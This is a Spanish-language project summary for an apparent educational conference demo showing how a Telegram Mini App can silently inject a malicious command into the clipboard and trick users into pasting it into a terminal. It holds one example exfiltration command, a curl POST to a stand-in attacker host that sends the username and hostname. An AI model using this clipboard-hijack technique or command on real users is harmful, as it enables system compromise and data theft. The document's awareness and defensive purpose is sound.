# 📊 Resumen Ejecutivo - Demo MorterueloCon 2026

## 🎯 Visión General

**Proyecto:** Demo de Seguridad - Manipulación de Portapapeles en Telegram Mini Apps  
**Evento:** MorterueloCon 2026  
**Categoría:** Demostración Educativa de Seguridad  
**Nivel de Riesgo:** Alto (Educational PoC)  
**Estado:** ✅ Listo para Demo

---

## 📝 Resumen del Proyecto

Esta es una **Prueba de Concepto (PoC) educativa** que demuestra cómo las Mini Apps de Telegram pueden explotar la API del portapapeles en aplicaciones de escritorio para ejecutar ataques de ingeniería social.

### Características Principales:

✅ **Interfaz Realista** - Simula una aplicación legítima de "validación"  
✅ **Inyección de Portapapeles** - Modifica el portapapeles silenciosamente  
✅ **Ingeniería Social** - Convence al usuario de ejecutar comandos maliciosos  
✅ **Demo Interactiva** - Permite ver el payload inyectado  
✅ **Educativa** - Incluye explicaciones y contramedidas

---

## 🎬 ¿Qué Hace la Demo?

### Escenario del Ataque:

```
1. Usuario abre Mini App → Ve interfaz de "validación"
2. Hace clic en botón → Se inyecta payload en portapapeles
3. Ve mensaje de éxito → Es instruido a ejecutar "comando de verificación"
4. Pega en terminal (Ctrl+V) → Ejecuta código malicioso
5. Sistema comprometido → Datos exfiltrados o malware instalado
```

### Payload de Demostración (Inocuo):

```bash
curl -X POST https://attacker-server.com/steal-data -d "$(whoami):$(hostname)"
```

**Nota:** La demo NO ejecuta el comando, solo lo inyecta en el portapapeles para demostración.

---

## 🔧 Stack Técnico

| Componente | Tecnología |
|------------|------------|
| **Framework** | Vue 3 + TypeScript |
| **Build Tool** | Vite |
| **SDK** | @tma.js/sdk-vue (Telegram Mini Apps) |
| **Styling** | CSS Scoped Components |
| **API** | Clipboard API (navigator.clipboard) |
| **Deployment** | GitHub Pages / Vercel / Netlify |

---

## 📁 Estructura del Proyecto

```
demo_morteruelocon_2026/
├── src/
│   ├── pages/
│   │   ├── ClipboardDemoPage.vue  ← 🎯 Demo principal
│   │   └── IndexPage.vue          ← Página inicial actualizada
│   └── router/
│       └── index.ts               ← Rutas actualizadas
├── public/
│   └── tonconnect-manifest.json
├── README.md                      ← Documentación principal
├── PRESENTACION.md                ← Notas para la charla
├── ETICA_Y_SEGURIDAD.md          ← Consideraciones éticas
└── DESPLIEGUE.md                 ← Guía de despliegue
```

---

## 🚀 Pasos para Usar la Demo

### Para el Presentador:

1. **Desplegar la aplicación** (GitHub Pages, Vercel, etc.)
2. **Crear bot de Telegram** con @BotFather
3. **Configurar Mini App** con la URL desplegada
4. **Practicar la demo** varias veces
5. **Presentar en la conferencia** siguiendo el script

### Para el Público:

1. **Acceder a la Mini App** desde Telegram Desktop
2. **Ver la demo** de inyección de portapapeles
3. **Aprender sobre el ataque** y las contramedidas
4. **Aplicar lecciones** en sus propios proyectos

---

## ⚖️ Consideraciones Legales y Éticas

### ✅ Uso Permitido:

- Demostraciones educativas
- Entrenamientos de seguridad
- Investigación con autorización
- Desarrollo de defensas

### ❌ Uso Prohibido:

- Ataques reales a sistemas
- Robo de información
- Distribución de malware
- Cualquier actividad ilegal

### 📜 Marco Legal:

- **España**: Código Penal (Art. 197, 264)
- **Europa**: GDPR, Directiva NIS2
- **Internacional**: Convenio de Budapest

**⚠️ IMPORTANTE:** Este proyecto es solo para educación. El mal uso puede tener consecuencias legales graves.

---

## 🛡️ Impacto y Lecciones

### ¿Por Qué es Importante?

1. **Concienciación**: Muestra riesgos reales de aplicaciones modernas
2. **Educación**: Enseña técnicas de defensa
3. **Prevención**: Ayuda a detectar ataques similares
4. **Mejora**: Promueve desarrollo seguro

### Lecciones Clave:

- ❗ **No confíes ciegamente** en aplicaciones
- 🔍 **Revisa antes de pegar** comandos en terminal
- 🛡️ **Implementa defensas** en tus aplicaciones
- 📚 **Educa a usuarios** sobre seguridad

---

## 📊 Métricas de Éxito

### Objetivos de la Demo:

- [x] Crear PoC funcional
- [x] Demostrar ataque de forma clara
- [x] Educar sobre contramedidas
- [ ] Presentar en MorterueloCon 2026
- [ ] Recibir feedback de la comunidad
- [ ] Inspirar mejoras en seguridad

### KPIs Post-Presentación:

- **Asistentes alcanzados**: [TBD]
- **Stars en GitHub**: [TBD]
- **Menciones en redes**: [TBD]
- **Implementación de contramedidas**: [TBD]

---

## 🔗 Enlaces Rápidos

| Recurso | Descripción |
|---------|-------------|
| [README.md](README.md) | Documentación completa del proyecto |
| [PRESENTACION.md](PRESENTACION.md) | Notas y script para la charla |
| [DESPLIEGUE.md](DESPLIEGUE.md) | Guía paso a paso de despliegue |
| [ETICA_Y_SEGURIDAD.md](ETICA_Y_SEGURIDAD.md) | Consideraciones éticas y legales |
| [ClipboardDemoPage.vue](src/pages/ClipboardDemoPage.vue) | Código principal de la demo |

---

## 🎤 Audiencia Objetivo

### Perfil:

- **Desarrolladores**: Aprenden a implementar seguridad
- **Profesionales de Seguridad**: Ven nuevos vectores de ataque
- **Arquitectos de Software**: Diseñan sistemas más seguros
- **Usuarios Técnicos**: Entienden riesgos y defensas

### Nivel Técnico:

- **Básico**: Entienden el concepto general
- **Intermedio**: Pueden reproducir la demo
- **Avanzado**: Pueden implementar contramedidas

---

## 💡 Ideas Futuras

### Posibles Extensiones:

1. **Múltiples Payloads**
   - Ejemplos para Windows, macOS, Linux
   - Diferentes tipos de ataques

2. **Detección y Prevención**
   - Herramientas para monitorear portapapeles
   - Extensiones de navegador

3. **Modo Tutorial Interactivo**
   - Guía paso a paso
   - Ejercicios prácticos

4. **Análisis Forense**
   - Cómo detectar este ataque
   - Indicadores de compromiso (IoC)

5. **Comparativa de Plataformas**
   - WhatsApp, Discord, Slack
   - Otros vectores similares

---

## 🤝 Contribuciones

### ¿Quieres Contribuir?

- 🐛 **Reporta bugs**: Abre un issue
- 💡 **Sugiere mejoras**: Pull requests bienvenidos
- 📚 **Mejora docs**: Ayuda con la documentación
- 🔒 **Añade contramedidas**: Implementa defensas

### Código de Conducta:

- Sé respetuoso
- Usa éticamente
- Colabora constructivamente
- Promueve la seguridad

---

## 📞 Contacto

### Autor Principal:

- **Nombre**: [TU_NOMBRE]
- **Email**: [TU_EMAIL]
- **GitHub**: [@tu_usuario](https://github.com/tu_usuario)
- **Twitter/X**: [@tu_handle](https://twitter.com/tu_handle)
- **LinkedIn**: [tu_perfil](https://linkedin.com/in/tu_perfil)

### Soporte:

- **Issues**: [GitHub Issues](https://github.com/tu_usuario/demo_morteruelocon_2026/issues)
- **Discusiones**: [GitHub Discussions](https://github.com/tu_usuario/demo_morteruelocon_2026/discussions)
- **Email**: demo-support@tu-dominio.com

---

## 🏆 Agradecimientos

### Gracias a:

- **MorterueloCon 2026** por la oportunidad de presentar
- **Telegram** por la plataforma Mini Apps
- **@tma.js** por el SDK excelente
- **Comunidad de seguridad** por el feedback
- **Todos los asistentes** por su interés

---

## 📅 Timeline del Proyecto

```
📍 Día 0:   Idea inicial
📍 Día 1-2: Desarrollo de la PoC
📍 Día 3:   Testing y refinamiento
📍 Día 4:   Documentación
📍 Día 5+:  Preparación para la demo
📍 [FECHA]: 🎤 Presentación en MorterueloCon 2026
```

---

## ✅ Checklist Final

### Antes de la Presentación:

- [x] Código funcionando
- [x] Demo desplegada
- [x] Documentación completa
- [x] Consideraciones éticas
- [x] Bot de Telegram configurado
- [ ] Mini App publicada
- [ ] Slides preparados
- [ ] Demo practicada
- [ ] Backup plan listo

### Durante la Presentación:

- [ ] Laptop cargada
- [ ] Internet estable
- [ ] Telegram Desktop abierto
- [ ] Terminal preparada
- [ ] Demo ejecutada exitosamente

### Después de la Presentación:

- [ ] Repositorio compartido
- [ ] Feedback recopilado
- [ ] Contactos establecidos
- [ ] Artículo/Blog post publicado

---

## 🎯 Mensaje Final

Esta demo es una herramienta **educativa** diseñada para:

- ✅ **Concienciar** sobre riesgos de seguridad
- ✅ **Educar** a desarrolladores y usuarios
- ✅ **Promover** prácticas de desarrollo seguro
- ✅ **Mejorar** la seguridad del ecosistema

**Úsala responsablemente. Aprende. Enseña. Protege.** 🛡️

---

**🔒 Seguridad a través de la Educación - MorterueloCon 2026 🔒**

---

_Última actualización: Febrero 2026_
